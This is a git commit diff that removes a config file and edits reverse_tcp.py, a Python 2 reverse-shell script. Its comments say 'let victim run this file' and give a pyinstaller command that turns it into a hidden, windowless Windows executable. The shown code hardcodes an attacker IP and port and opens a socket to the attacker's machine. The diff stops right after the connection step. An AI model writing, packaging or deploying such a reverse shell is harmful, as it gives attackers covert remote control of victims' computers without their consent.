543c1959f6b958e95958e651e1902e2391fb8d3f
Yiyi Wang <shd101wyy@sina.com>
2015-05-06 23:25:47 -0500

    remove some unnecessary files

--- attacker_info.py
+++
@@ -1,4 +0,0 @@
-### modify the ip/port in this file for attacker
-
-attacker_ip = "127.0.0.1"
-attacker_port = 6667
--- reverse_tcp.py
+++ reverse_tcp.py
@@ -1,11 +1,10 @@
 #/usr/bin/env python
 ### Use python 2
-### (need to modify the ip/port in attacker_info.py)
 ### let victim run this file
 ### To convert this file to windows exe, use "pyinstaller" and run "pyinstaller --noconsole --onefile reverse_tcp.py"
-import socket, subprocess, attacker_info, os
-attacker_ip = attacker_info.attacker_ip      ## attacker's ip
-attacker_port = attacker_info.attacker_port  ## attacker's port
+import socket, subprocess, os
+attacker_ip = "192.168.2.10"        ## attacker's ip, change this ip address if necessary.
+attacker_port = 6667                ## attacker's port
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## connect to attacker's machine
 s.connect((attacker_ip, attacker_port))
 
